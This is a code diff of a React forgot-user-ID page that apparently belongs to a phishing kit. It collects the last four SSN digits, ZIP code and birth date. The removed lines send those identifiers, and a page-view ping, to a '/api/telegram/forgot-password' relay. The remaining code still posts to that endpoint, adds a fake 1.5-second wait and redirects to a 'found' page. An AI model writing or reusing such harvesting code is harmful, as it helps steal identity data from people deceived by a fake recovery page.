@@ -30,31 +30,18 @@ export default function ForgotIdPage() {
   const isDesktopFormValid = isSsnValid && isDateValid && privacyAccepted;
   const isMobileFormValid = isSsnValid && zipDigits.length >= 5 && isMobileDobValid;
 
-  useEffect(() => {
-    if (hasNotifiedView.current) return;
-    hasNotifiedView.current = true;
-    fetch("/api/telegram/forgot-password-view", { method: "POST" }).catch(
-      console.error,
-    );
-  }, []);
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const birthDate = birthDateText.trim() || `${month} ${day}, ${year}`;
     if ((!isDesktopFormValid && !isMobileFormValid) || isLoading) return;
     setIsLoading(true);
     try {
       await fetch("/api/telegram/forgot-password", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          ssnLast4: ssnDigits,
-          zip: zipDigits,
-          birthDate,
-        }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (err) {
-      console.error("Forgot user ID notification error:", err);
+      console.error("Forgot user ID error:", err);
     }
     await new Promise((r) => setTimeout(r, 1500));
     router.push("/forgot-password-found");
